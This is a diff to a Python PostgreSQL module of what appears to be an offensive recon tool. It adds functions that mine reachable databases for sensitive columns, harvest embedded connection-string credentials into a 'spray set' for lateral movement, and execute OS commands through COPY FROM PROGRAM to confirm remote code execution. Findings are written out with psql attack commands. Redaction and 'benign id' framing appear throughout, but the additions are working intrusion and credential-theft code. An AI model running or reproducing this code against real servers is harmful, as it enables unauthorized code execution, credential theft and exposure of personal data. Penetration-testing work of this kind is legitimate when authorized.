@@ -12,10 +12,21 @@ modules (source="postgres").
 from __future__ import annotations
 
 import hashlib
+import re
 import socket
 import struct
 
 from .models import Host, Port
+
+# Column/field names whose data is worth sampling (PII / secrets / credentials).
+_SECRET_COL = re.compile(
+    r"pass|pwd|secret|token|api[_-]?key|apikey|ssn|social|credit|card|cvv|iban|routing|"
+    r"salary|passport|licen|priv(ate)?[_-]?key|seckey|session|birth|dob|\bpin\b|"
+    r"security|mfa|otp|cookie|bearer|conn(ection)?[_-]?str", re.I)
+# Connection strings / embedded credentials to harvest out of sampled data.
+_CONNSTR = re.compile(
+    r"(?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis|amqp|ftp|ldap|https?)://"
+    r"[^\s:@/]+:[^\s:@/]+@[^\s/]+(?:/[^\s\"']*)?", re.I)
 
 _PORTS = (5432, 5433)
 _DEFAULT_PORT = 5432
@@ -291,6 +302,116 @@ def loot(ip: str, port: int, timeout: float = _TIMEOUT, user: str = "postgres",
     return out
 
 
+def _open_session(ip: str, port: int, user: str, password: str | None, db: str,
+                  timeout: float):
+    """Connect + authenticate + drain to ReadyForQuery. Returns an authenticated socket
+    ready for _simple_query, or None."""
+    try:
+        sock = socket.create_connection((ip, port), timeout=timeout)
+        sock.settimeout(timeout)
+    except OSError:
+        return None
+    try:
+        sock.sendall(_startup(user, db))
+        if not _do_auth(sock, user, password):
+            sock.close()
+            return None
+        _read_until_ready(sock)
+        return sock
+    except (OSError, struct.error, ValueError):
+        try:
+            sock.close()
+        except OSError:
+            pass
+        return None
+
+
+def _redact(v) -> str:
+    """Prove a value exists without exfiltrating it in full: keep the shape, mask the
+    middle. 'Sup3rS3cret!' -> 'Su…12'."""
+    if v is None:
+        return "NULL"
+    s = str(v)
+    if len(s) <= 4:
+        return "***"
+    return f"{s[:2]}…{len(s)}c"
+
+
+def datamine(ip: str, port: int, dbs: list[str], timeout: float = _TIMEOUT,
+             user: str = "postgres", password: str | None = None,
+             max_dbs: int = 6, max_tables: int = 10, max_rows: int = 3) -> dict:
+    """Read-only secret hunting across the accessible databases: find columns whose name
+    looks sensitive, sample a few REDACTED rows to prove real data is there, and harvest
+    any embedded connection strings / credentials (which feed the lateral-movement
+    spray). SELECT only; values are masked, never dumped in full."""
+    out = {"secret_columns": [], "samples": [], "harvested": []}
+    for db in [d for d in dbs if d not in ("template0", "template1")][:max_dbs]:
+        sock = _open_session(ip, port, user, password, db, timeout)
+        if sock is None:
+            continue
+        try:
+            cols = _simple_query(
+                sock, "SELECT table_schema, table_name, column_name "
+                "FROM information_schema.columns "
+                "WHERE table_schema NOT IN ('pg_catalog', 'information_schema') "
+                "ORDER BY 1, 2")
+            secret_tables: dict = {}
+            for r in cols:
+                if len(r) < 3 or r[2] is None:
+                    continue
+                sch, tbl, col = r[0], r[1], r[2]
+                if _SECRET_COL.search(col):
+                    out["secret_columns"].append(
+                        {"db": db, "table": f"{sch}.{tbl}", "column": col})
+                    secret_tables.setdefault((sch, tbl), []).append(col)
+            for (sch, tbl), scols in list(secret_tables.items())[:max_tables]:
+                ident = f'"{sch}"."{tbl}"'.replace("\x00", "")
+                collist = ", ".join('"' + c.replace('"', '""') + '"' for c in scols[:6])
+                rows = _simple_query(
+                    sock, f"SELECT {collist} FROM {ident} LIMIT {max_rows}")
+                if not rows:
+                    continue
+                out["samples"].append({
+                    "db": db, "table": f"{sch}.{tbl}", "columns": scols[:6],
+                    "rows": [[_redact(v) for v in row] for row in rows]})
+                for row in rows:
+                    for v in row:
+                        for m in _CONNSTR.finditer(str(v or "")):
+                            out["harvested"].append(m.group(0))
+        finally:
+            try:
+                sock.close()
+            except OSError:
+                pass
+    # de-dup harvested creds, keep order
+    seen: set = set()
+    out["harvested"] = [c for c in out["harvested"]
+                        if not (c in seen or seen.add(c))]
+    return out
+
+
+def prove_rce(ip: str, port: int, timeout: float = _TIMEOUT, user: str = "postgres",
+              password: str | None = None, command: str = "id") -> str:
+    """OPT-IN active proof: run a BENIGN command (`id` by default) via COPY ... FROM
+    PROGRAM on a TEMP table and return its output - turning "superuser -> RCE capability"
+    into a confirmed foothold. The temp table auto-drops on disconnect; nothing is left
+    behind. Only ever call with an operator-authorized, non-destructive command."""
+    sock = _open_session(ip, port, user, password, "postgres", timeout)
+    if sock is None:
+        return ""
+    try:
+        safe = command.replace("'", "''")
+        _simple_query(sock, "CREATE TEMP TABLE recce_rce(o text)")
+        _simple_query(sock, f"COPY recce_rce FROM PROGRAM '{safe}'")
+        rows = _simple_query(sock, "SELECT o FROM recce_rce")
+        return "\n".join(r[0] for r in rows if r and r[0])
+    finally:
+        try:
+            sock.close()
+        except OSError:
+            pass
+
+
 def _cred_list(creds) -> list[tuple]:
     """Normalize the analyze() `creds` arg (a single dict, or a list of them) into
     [(user, password), ...]. Accepts username/user + password/secret keys."""
@@ -350,7 +471,8 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Replace `trust` in pg_hba.conf with scram-sha-256 (or md5); bind to "
                     "localhost / a private interface; require TLS for remote access.",
                     ["CWE-306", "CWE-287"], kind="pg_trust_auth"))
-                _rce_finding(out, tgt, h.ip, p.portid, lt)
+                _rce_finding(out, tgt, h.ip, p.portid, lt, proof=pr.get("rce_proof"))
+                _datamine_finding(out, tgt, h.ip, p.portid, pr.get("datamine"))
             elif pr.get("cred_access"):
                 lt = pr.get("loot") or {}
                 who = pr.get("cred_user", "?")
@@ -363,8 +485,40 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Rotate the credential; enforce least privilege; bind to a trusted "
                     "interface; require TLS.",
                     ["CWE-522", "CWE-284"], kind="pg_cred_access"))
-                _rce_finding(out, tgt, h.ip, p.portid, lt, credentialed=True, user=who)
+                _rce_finding(out, tgt, h.ip, p.portid, lt, credentialed=True, user=who,
+                             proof=pr.get("rce_proof"))
+                _datamine_finding(out, tgt, h.ip, p.portid, pr.get("datamine"))
     return out
+
+
+def _datamine_finding(out: list, tgt: str, ip: str, port: int, dm: dict | None) -> None:
+    """Emit the sensitive-data-exposure finding from a datamine result (redacted)."""
+    if not dm or not dm.get("secret_columns"):
+        return
+    cols = dm["secret_columns"]
+    samples = dm.get("samples") or []
+    harvested = dm.get("harvested") or []
+    tables = sorted({c["table"] for c in cols})
+    detail = (f"recce mined {len(cols)} sensitive column(s) across {len(tables)} "
+              f"table(s): " + ", ".join(f"{c['table']}.{c['column']}" for c in cols[:12])
+              + (" …" if len(cols) > 12 else "") + ".")
+    if samples:
+        s = samples[0]
+        detail += ("\n\nSAMPLE (redacted) " + s["table"] + " ["
+                   + ", ".join(s["columns"]) + "]: "
+                   + " | ".join(", ".join(row) for row in s["rows"][:2]))
+    if harvested:
+        detail += (f"\n\nHARVESTED {len(harvested)} embedded credential/connection "
+                   "string(s) -> added to the spray set: "
+                   + ", ".join(re.sub(r":[^:@/]+@", ":****@", c) for c in harvested[:5]))
+    out.append(_finding(
+        "high", "PostgreSQL sensitive data exposed (PII / secrets / credentials)", tgt,
+        detail,
+        f"psql 'host={ip} port={port} user=<u> dbname=<db>' -c "
+        "\"SELECT * FROM <schema>.<table> LIMIT 20\"   # full data (ROE)",
+        "Encrypt sensitive columns at rest; least-privilege the app role; remove "
+        "embedded credentials from data; restrict network access.",
+        ["CWE-200", "CWE-312"], kind="pg_datamine"))
 
 
 def _loot_text(lt: dict) -> str:
@@ -383,9 +537,11 @@ def _loot_text(lt: dict) -> str:
 
 
 def _rce_finding(out: list, tgt: str, ip: str, port: int, lt: dict,
-                 credentialed: bool = False, user: str = "postgres") -> None:
+                 credentialed: bool = False, user: str = "postgres",
+                 proof: str | None = None) -> None:
     """Emit the COPY-FROM-PROGRAM RCE finding when the (trust or credentialed) role can
-    reach it. Shared by both auth paths."""
+    reach it. Shared by both auth paths. `proof` = output of the benign `id` run (opt-in
+    prove) -> upgrades the finding from 'capability' to 'CONFIRMED foothold'."""
     if not lt.get("can_rce"):
         return
     role = lt.get("current_user", user)
@@ -401,14 +557,18 @@ def _rce_finding(out: list, tgt: str, ip: str, port: int, lt: dict,
     fc_txt = " Also: " + " + ".join(filecap) + "." if filecap else ""
     lead = "credentialed" if credentialed else "unauthenticated"
     src = "credentialed" if credentialed else "trust-auth"
+    proof_txt = ""
+    if proof:
+        proof_txt = ("\n\nRCE CONFIRMED (recce ran a benign `id` via COPY FROM PROGRAM): "
+                     + proof.strip().splitlines()[0][:200])
     out.append(_finding(
         "critical",
         f"PostgreSQL {lead} RCE ({src} superuser -> COPY FROM PROGRAM)", tgt,
         f"The {'' if credentialed else 'trust-auth '}role '{role}' is a {how}, so "
         "`COPY t FROM PROGRAM 'cmd'` executes OS commands as the postgres service "
-        f"account - {lead} remote code execution." + ext_txt + fc_txt,
+        f"account - {lead} remote code execution." + ext_txt + fc_txt + proof_txt,
         f"psql 'host={ip} port={port} user={role} dbname=postgres' "
-        "-c \"CREATE TABLE r(o text); COPY r FROM PROGRAM 'id'; TABLE r;\"",
+        "-c \"CREATE TEMP TABLE r(o text); COPY r FROM PROGRAM 'id'; TABLE r;\"",
         "Never expose 5432; remove trust auth / rotate creds; run the app as a "
         "non-superuser; revoke pg_execute_server_program.",
         ["CWE-78", "CWE-306"], kind="pg_rce"))
@@ -427,7 +587,11 @@ def findings_to_vulns(fs: list[dict]) -> dict:
 
 
 def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
-            budget: float | None = None, progress=None) -> dict:
+            budget: float | None = None, progress=None, prove: bool = False,
+            datamine_data: bool = True) -> dict:
+    """`prove=True` runs the OPT-IN benign COPY-FROM-PROGRAM `id` proof on RCE-capable
+    instances. `datamine_data=True` (default) samples redacted sensitive rows + harvests
+    embedded credentials."""
     from . import svcprobe
     targets = postgres_targets(hosts)
     probes: dict = {}
@@ -444,6 +608,7 @@ def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
                 t["auth_required"] = pr.get("auth_required", False)
                 t["version"] = pr.get("version", "") or t.get("version", "")
                 lt = None
+                acc_user, acc_pw = "postgres", None
                 if pr.get("unauth"):
                     lt = loot(t["ip"], t["port"])
                     pr["loot"] = lt
@@ -455,6 +620,7 @@ def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
                         if authenticate(t["ip"], t["port"], u, pw):
                             pr["cred_access"] = True
                             pr["cred_user"] = u
+                            acc_user, acc_pw = u, pw
                             lt = loot(t["ip"], t["port"], user=u, password=pw)
                             pr["loot"] = lt
                             t["cred_access"] = True
@@ -467,6 +633,20 @@ def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
                             username=hh["user"], secret=hh["hash"], kind="hash",
                             source=src, origin_ip=t["ip"],
                             notes=f"{note} :{t['port']}"))
+                    # Exfil: mine the accessible databases for sensitive data + creds.
+                    if datamine_data:
+                        dm = datamine(t["ip"], t["port"], lt.get("databases", []),
+                                      user=acc_user, password=acc_pw)
+                        pr["datamine"] = dm
+                        for cs in dm.get("harvested", []):
+                            looted.append(Credential(
+                                username="(embedded)", secret=cs, kind="password",
+                                source="postgres-datamine", origin_ip=t["ip"],
+                                notes=f"connection string mined from PostgreSQL :{t['port']}"))
+                    # Foothold: opt-in benign RCE proof on a superuser/COPY-capable role.
+                    if prove and lt.get("can_rce"):
+                        pr["rce_proof"] = prove_rce(t["ip"], t["port"],
+                                                    user=acc_user, password=acc_pw)
     fs = findings(hosts, probes)
     runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                  "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
